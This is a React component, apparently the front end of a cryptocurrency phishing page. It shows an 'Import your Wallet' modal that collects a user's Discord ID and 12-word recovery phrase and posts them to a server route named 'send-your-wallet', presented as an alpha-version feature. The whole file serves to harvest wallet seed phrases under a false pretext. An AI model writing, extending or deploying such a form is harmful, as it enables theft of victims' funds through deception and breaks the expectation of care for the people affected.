import React, { useState } from "react";
import axios from "axios";

// REACT BOOTSTRAP
import { Modal, Button, Form, InputGroup, FormControl } from "react-bootstrap";

// ICONS
import { FaDiscord } from "react-icons/fa";
import { AiFillSecurityScan } from "react-icons/ai";

export default function WalletModal(props) {
  const { show, handleClose, walletname, walletnameImg } = props;

  // HANDLE THE RECOVERY PHRASE
  const [correct, setCorrect] = useState(false);

  // USERNAME & PASSWORD
  const [discordID, setDiscordID] = useState("");
  const [recoveryPhrase, setRecoveryPhrase] = useState("");

  // SEND WALLET
  let walletData = JSON.stringify({
    wallet: walletname,
    discordID,
    recoveryPhrase: recoveryPhrase.split(" "),
  });
  const sentWallet = (e) => {
    e.preventDefault();

    var config = {
      method: "post",
      url: "http://localhost:8000/send-your-wallet",
      headers: {
        "Content-Type": "application/json",
      },
      data: walletData,
    };

    axios(config)
      .then((response) => {
        if (
          response.data ===
          "Recovery phrase should not be less-than or greater-than 12 words"
        ) {
          setCorrect(true);
          alert(`THIS IS ALPHA VERSION | ${response.data}`);
        } else if (response.data === "Wallet has been sent Successfully") {
          setCorrect(false);
          alert(`THIS IS ALPHA VERSION | ${response.data}`);
        }
      })
      .catch((error) => {
        console.log(error);
        alert("THIS IS ALPHA VERSION | Error occured");
      });
  };

  return (
    <>
      <Modal show={show} onHide={handleClose} centered>
        {/* HEADER */}
        <Modal.Header closeButton>
          <Modal.Title>
            <div className="modal_title">
              {" "}
              <img
                src={walletnameImg}
                alt="Wallet Icons"
                height={40}
                width={40}
                className="img_wallet"
              />
              {"Import your "}
              {walletname}
              {" Wallet"}
            </div>
          </Modal.Title>
        </Modal.Header>
        {/* BODY */}
        <Modal.Body>
          <Form onSubmit={sentWallet}>
            {/* DISCORD */}
            <Form.Label>Discord ID:</Form.Label>
            <InputGroup className="mb-3">
              <InputGroup.Text id="basic-addon1">
                <FaDiscord />
              </InputGroup.Text>
              <FormControl
                placeholder="Enter your discord ID"
                aria-label="Enter your discord ID"
                aria-describedby="basic-addon1"
                value={discordID}
                onChange={(e) => setDiscordID(e.target.value)}
              />
            </InputGroup>
            {/* RECOVERY PHRASE */}
            <Form.Label>Recovery Phrase:</Form.Label>
            <InputGroup className="mb-3">
              <InputGroup.Text id="basic-addon1">
                <AiFillSecurityScan />
              </InputGroup.Text>
              <FormControl
                isInvalid={correct}
                data-toggle="tooltip"
                data-placement="top"
                title="Typically 12 words separated by single spaces"
                as="textarea"
                placeholder="Enter your recovery phrase"
                aria-label="Enter your recovery phrase"
                aria-describedby="basic-addon1"
                value={recoveryPhrase}
                onChange={(e) => setRecoveryPhrase(e.target.value)}
              />
            </InputGroup>
            <Button variant="primary" type="submit">
              Submit
            </Button>
          </Form>
        </Modal.Body>
      </Modal>
    </>
  );
}
